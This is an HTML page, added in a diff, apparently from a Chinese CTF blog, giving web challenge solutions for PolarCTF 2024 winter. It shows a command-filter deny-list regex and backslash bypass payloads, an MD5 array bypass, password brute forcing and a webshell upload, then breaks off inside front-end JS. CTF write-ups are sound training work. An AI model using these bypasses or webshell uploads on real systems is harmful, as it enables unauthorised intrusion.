@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta property="og:type" content="article">
+<meta property="og:title" content="PolarCTF2024冬季个人挑战赛web题解">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/12/11/PolarCTF2024%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251211132014450.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251211132507648.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251211132633087.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251211134127869.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251212120329958.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251212120503677.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251212120650567.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251212120837468.png">
+<meta property="article:published_time" content="2025-12-11T04:55:06.000Z">
+<meta property="article:modified_time" content="2025-12-12T04:17:37.952Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="PolarCTF2024冬季个人挑战赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251211132014450.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2025/12/11/PolarCTF2024%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/12/11/PolarCTF2024%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/","path":"2025/12/11/PolarCTF2024冬季个人挑战赛web题解/","title":"PolarCTF2024冬季个人挑战赛web题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PolarCTF2024冬季个人挑战赛web题解 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8B%97%E9%BB%91%E5%AD%90%E7%9A%84RCE"><span class="nav-number">1.</span> <span class="nav-text">狗黑子的RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">#RCE的绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BC%E8%88%AA%E7%AB%99"><span class="nav-number">2.</span> <span class="nav-text">简单的导航站</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#md5%E7%BB%95%E8%BF%87-%E8%B6%8A%E6%9D%83-%E7%88%86%E7%A0%B4"><span class="nav-number">2.1.</span> <span class="nav-text">#md5绕过+越权+爆破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#button"><span class="nav-number">3.</span> <span class="nav-text">button</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFjs"><span class="nav-number">3.1.</span> <span class="nav-text">#前端js</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%95%E5%AD%97%E6%A3%8B"><span class="nav-number">4.</span> <span class="nav-text">井字棋</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFjs-1"><span class="nav-number">4.1.</span> <span class="nav-text">#前端js</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xxmmll"><span class="nav-number">5.</span> <span class="nav-text">xxmmll</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">5.1.</span> <span class="nav-text">#XXE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Note"><span class="nav-number">6.</span> <span class="nav-text">Note</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">171</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">123</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/12/11/PolarCTF2024%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PolarCTF2024冬季个人挑战赛web题解 | root@wanth3f1ag">
+      <meta itemprop="description" content=" ">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PolarCTF2024冬季个人挑战赛web题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-12-11 12:55:06" itemprop="dateCreated datePublished" datetime="2025-12-11T12:55:06+08:00">2025-12-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-12 12:17:37" itemprop="dateModified" datetime="2025-12-12T12:17:37+08:00">2025-12-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description"> </div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="狗黑子的RCE"><a href="#狗黑子的RCE" class="headerlink" title="狗黑子的RCE"></a>狗黑子的RCE</h1><h2 id="RCE的绕过"><a href="#RCE的绕过" class="headerlink" title="#RCE的绕过"></a>#RCE的绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$gouheizi1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gouheizi1&#x27;</span>];</span><br><span class="line">    <span class="variable">$gouheizi2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;gouheizi2&#x27;</span>];</span><br><span class="line">    <span class="variable">$gouheizi2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;gouheizi&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$gouheizi2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$gouheizi1</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;badly!&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$gouheizi2</span>===<span class="string">&quot;gouheizi&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$gouheizi1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;gouheizi!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">gouheizi!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>会将$gouheizi2中的gouheizi替换成空，我们用双写绕过，至于里面的命令过滤，可以用反斜杠去绕过</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?gouheizi1=l\s /</span><br><span class="line">gouheizi2=gougouheiziheizi</span><br><span class="line"></span><br><span class="line">?gouheizi1=ca\t /fla\g.php</span><br><span class="line">gouheizi2=gougouheiziheizi</span><br></pre></td></tr></table></figure>
+
+<h1 id="简单的导航站"><a href="#简单的导航站" class="headerlink" title="简单的导航站"></a>简单的导航站</h1><h2 id="md5绕过-越权-爆破"><a href="#md5绕过-越权-爆破" class="headerlink" title="#md5绕过+越权+爆破"></a>#md5绕过+越权+爆破</h2><p>上传文件的口子需要管理员登录，并且提示管理员不一定是admin</p>
+<p>注册后登录，有一个查看用户列表</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;user.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user1&#x27;</span>];</span><br><span class="line"><span class="variable">$user2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user1</span> != <span class="variable">$user2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$user1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$user2</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$user</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;MD5值校验出错啦啦啦......&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;user不能相等！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">user不能相等！</span><br></pre></td></tr></table></figure>
+
+<p>md5的强比较，直接用数组绕过就行</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/audit.php?user1[]=1&amp;user2[]=2</span><br></pre></td></tr></table></figure>
+
+<p>然后拿到了用户名列表</p>
+<p>在主页源代码发现有一个<code>Admin1234</code>，估计是密码需要爆破吧</p>
+<p>爆了几次没爆出来，后面才发现密码漏了个感叹号…..</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251211132014450.png" alt="image-20251211132014450"></p>
+<p>登录后打文件上传，一点限制都没有，没回显路径，猜测了一波路径是<code>/uploads/</code></p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251211132507648.png" alt="image-20251211132507648"></p>
+<p>上传马子后蚁剑连接，但是flag有很多，直接拿去刚刚的认证爆破就行了</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251211132633087.png" alt="image-20251211132633087"></p>
+<h1 id="button"><a href="#button" class="headerlink" title="button"></a>button</h1><h2 id="前端js"><a href="#前端js" class="headerlink" title="#前端js"></a>#前端js</h2><p>点不到的按钮，看看前端的js文件怎么写的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myButton&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> flagDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> viewportWidth = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line"><span class="keyword">const</span> viewportHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> buttonWidth = button.<span class="property">offsetWidth</span>;</span><br><span class="line"><span class="keyword">const</span> buttonHeight = button.<span class="property">offsetHeight</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> clickCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseover&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> randomX = <span class="title class_">Math</span>.<span class="title function_">random</span>() * (viewportWidth - buttonWidth) - (viewportWidth / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">const</span> randomY = <span class="title class_">Math</span>.<span class="title function_">random</span>() * (viewportHeight - buttonHeight) - (viewportHeight / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">`translate(<span class="subst">$&#123;randomX&#125;</span>px, <span class="subst">$&#123;randomY&#125;</span>px)`</span>;  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    clickCount++;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clickCount === <span class="number">999999999999999999999999999999999999999999999999999999999999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/proxy.php?file=flag&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;getFlag.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            flagDiv.<span class="property">innerHTML</span> = xhr.<span class="property">responseText</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, handleClick);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">key</span> === <span class="string">&#x27;Tab&#x27;</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">ctrlKey</span>) &#123;</span><br><span class="line">        <span class="comment">// Ctrl + C, Ctrl + V, Ctrl + X, Ctrl + A</span></span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">key</span> === <span class="string">&#x27;c&#x27;</span> || event.<span class="property">key</span> === <span class="string">&#x27;v&#x27;</span> || event.<span class="property">key</span> === <span class="string">&#x27;x&#x27;</span> || event.<span class="property">key</span> === <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">            event.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">key</span> === <span 